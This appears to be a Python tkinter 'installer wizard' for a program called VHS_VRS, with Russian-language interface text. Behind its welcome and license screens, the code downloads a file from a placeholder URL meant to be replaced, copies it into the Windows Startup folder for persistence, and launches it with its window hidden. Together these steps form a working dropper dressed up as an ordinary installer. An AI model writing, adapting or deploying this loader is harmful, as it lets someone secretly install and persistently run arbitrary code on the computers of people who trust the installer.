import os
import sys
import requests
import tkinter as tk
from tkinter import messagebox, scrolledtext
import shutil
import subprocess
from tkinter import font as tkfont

# ================== НАСТРОЙКИ ==================
DOWNLOAD_URL = "https://example.com/safe_script.py"  # 🔗 ЗАМЕНИ НА СВОЙ РЕАЛЬНЫЙ URL
FILE_NAME = "safe_script.py"
AUTOSTART_FOLDER = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
DEST_PATH = os.path.join(AUTOSTART_FOLDER, FILE_NAME)

LICENSE_TEXT = """
ЛИЦЕНЗИОННОЕ СОГЛАШЕНИЕ

Добро пожаловать в мастер установки VHS_VRS.

Перед использованием вы должны принять условия лицензии.

1. Программа предоставляется "как есть".
2. Автор не несет ответственности за любые последствия использования.
3. Вы имеете право прекратить использование в любой момент.
4. Программа может скачивать и запускать файлы — только с вашего согласия.

Нажимая "Принять", вы соглашаетесь с условиями.
"""

# ================== СТИЛИ ==================
BG_COLOR = "#1e1e2e"
FG_COLOR = "#ffffff"
ACCENT_COLOR = "#89b4fa"
BUTTON_HOVER = "#74a7f5"
BUTTON_ACTIVE = "#5e8bca"
FONT_TITLE = ("Segoe UI", 20, "bold")
FONT_NORMAL = ("Segoe UI", 11)
FONT_BUTTON = ("Segoe UI", 12, "bold")


# ================== ФУНКЦИИ ==================
def download_file(url, dest):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        with open(dest, 'wb') as f:
            f.write(response.content)
        return True
    except Exception as e:
        messagebox.showerror("Ошибка загрузки", f"Не удалось скачать файл:\n{e}")
        return False


def add_to_autostart(src_file):
    try:
        os.makedirs(AUTOSTART_FOLDER, exist_ok=True)
        shutil.copy2(src_file, DEST_PATH)
        return True
    except Exception as e:
        messagebox.showerror("Ошибка автозапуска", f"Не удалось добавить в автозагрузку:\n{e}")
        return False


def run_file(filepath):
    try:
        if sys.platform == "win32":
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            subprocess.Popen(
                filepath,
                startupinfo=startupinfo,
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            subprocess.Popen([sys.executable, filepath])
        return True
    except Exception as e:
        messagebox.showerror("Ошибка запуска", f"Не удалось запустить файл:\n{e}")
        return False


def start_installation():
    welcome_frame.pack_forget()
    license_frame.pack(fill="both", expand=True, padx=40, pady=20)


def accept_license():
    license_frame.pack_forget()

    # Показываем статус-бар установки
    progress_frame.pack(fill="both", expand=True, padx=40, pady=20)
    root.update()

    temp_path = os.path.join(os.getcwd(), FILE_NAME)

    # Шаг 1: Скачивание
    status_label.config(text="📥 Скачивание файла...")
    root.update()
    if not download_file(DOWNLOAD_URL, temp_path):
        return

    # Шаг 2: Добавление в автозагрузку
    status_label.config(text="🔗 Добавление в автозагрузку...")
    root.update()
    if not add_to_autostart(temp_path):
        return

    # Шаг 3: Запуск
    status_label.config(text="🚀 Запуск файла...")
    root.update()
    if run_file(temp_path):
        status_label.config(text="✅ Установка завершена!", fg=ACCENT_COLOR)
        messagebox.showinfo("Готово!", "Файл успешно установлен и запущен!")
    else:
        status_label.config(text="⚠️ Установка завершена с предупреждением", fg="orange")
        messagebox.showwarning("Предупреждение", "Файл установлен, но не удалось его запустить.")

    # Кнопка "Завершить"
    finish_btn.pack(pady=30)


def decline_license():
    messagebox.showinfo("Отмена", "Установка отменена.")
    sys.exit(0)


def on_enter(btn):
    btn['background'] = BUTTON_HOVER


def on_leave(btn):
    btn['background'] = ACCENT_COLOR


def finish_installation():
    sys.exit(0)


# ================== ИНТЕРФЕЙС ==================
root = tk.Tk()
root.title("Мастер установки VHS_VRS")
root.geometry("700x500")
root.resizable(False, False)
root.configure(bg=BG_COLOR)

# Центрирование окна
root.eval('tk::PlaceWindow . center')

# ========== ЭКРАН ПРИВЕТСТВИЯ ==========
welcome_frame = tk.Frame(root, bg=BG_COLOR)
welcome_frame.pack(fill="both", expand=True)

title_label = tk.Label(
    welcome_frame,
    text="Добро пожаловать в мастер установки",
    font=FONT_TITLE,
    fg=ACCENT_COLOR,
    bg=BG_COLOR
)
title_label.pack(pady=(80, 10))

sub_title = tk.Label(
    welcome_frame,
    text="VHS_VRS",
    font=("Segoe UI", 28, "bold"),
    fg=FG_COLOR,
    bg=BG_COLOR
)
sub_title.pack(pady=(0, 60))

desc_label = tk.Label(
    welcome_frame,
    text="Программа установит необходимые компоненты на ваш компьютер.\nНажмите 'Начать', чтобы продолжить.",
    font=FONT_NORMAL,
    fg="#a6adc8",
    bg=BG_COLOR,
    justify="center",
    wraplength=550
)
desc_label.pack(pady=20)

start_btn = tk.Button(
    welcome_frame,
    text="Начать установку",
    font=FONT_BUTTON,
    bg=ACCENT_COLOR,
    fg="white",
    bd=0,
    relief="flat",
    padx=30,
    pady=10,
    command=start_installation,
    cursor="hand2"
)
start_btn.pack(pady=40)

# Наведение
start_btn.bind("<Enter>", lambda e: on_enter(start_btn))
start_btn.bind("<Leave>", lambda e: on_leave(start_btn))

# ========== ЭКРАН ЛИЦЕНЗИИ ==========
license_frame = tk.Frame(root, bg=BG_COLOR)

license_title = tk.Label(
    license_frame,
    text="📜 Пожалуйста, прочитайте лицензионное соглашение",
    font=FONT_TITLE,
    fg=ACCENT_COLOR,
    bg=BG_COLOR
)
license_title.pack(pady=(30, 20))

text_area = scrolledtext.ScrolledText(
    license_frame,
    wrap=tk.WORD,
    width=80,
    height=15,
    font=("Segoe UI", 10),
    bg="#2a2a3a",
    fg=FG_COLOR,
    bd=0,
    padx=10,
    pady=10,
    relief="flat"
)
text_area.insert(tk.END, LICENSE_TEXT)
text_area.config(state=tk.DISABLED)
text_area.pack(padx=20, pady=10)

btn_frame = tk.Frame(license_frame, bg=BG_COLOR)
btn_frame.pack(pady=30)

accept_btn = tk.Button(
    btn_frame,
    text="✅ Принять и установить",
    font=FONT_BUTTON,
    bg=ACCENT_COLOR,
    fg="white",
    bd=0,
    relief="flat",
    padx=20,
    pady=8,
    command=accept_license,
    cursor="hand2"
)
accept_btn.pack(side="left", padx=10)
accept_btn.bind("<Enter>", lambda e: on_enter(accept_btn))
accept_btn.bind("<Leave>", lambda e: on_leave(accept_btn))

decline_btn = tk.Button(
    btn_frame,
    text="❌ Отклонить",
    font=FONT_BUTTON,
    bg="#f38ba8",
    fg="white",
    bd=0,
    relief="flat",
    padx=20,
    pady=8,
    command=decline_license,
    cursor="hand2"
)
decline_btn.pack(side="left", padx=10)
decline_btn.bind("<Enter>", lambda e: on_enter(decline_btn))
decline_btn.bind("<Leave>", lambda e: decline_btn.config(bg="#f38ba8"))

# ========== ЭКРАН УСТАНОВКИ ==========
progress_frame = tk.Frame(root, bg=BG_COLOR)

status_label = tk.Label(
    progress_frame,
    text="Подготовка к установке...",
    font=FONT_NORMAL,
    fg=FG_COLOR,
    bg=BG_COLOR
)
status_label.pack(pady=100)

# Кнопка Завершить (появится после установки)
finish_btn = tk.Button(
    progress_frame,
    text="Завершить",
    font=FONT_BUTTON,
    bg=ACCENT_COLOR,
    fg="white",
    bd=0,
    relief="flat",
    padx=30,
    pady=10,
    command=finish_installation,
    cursor="hand2"
)
finish_btn.bind("<Enter>", lambda e: on_enter(finish_btn))
finish_btn.bind("<Leave>", lambda e: on_leave(finish_btn))

# Скрываем фреймы, кроме первого
license_frame.pack_forget()
progress_frame.pack_forget()

# Запуск
root.mainloop()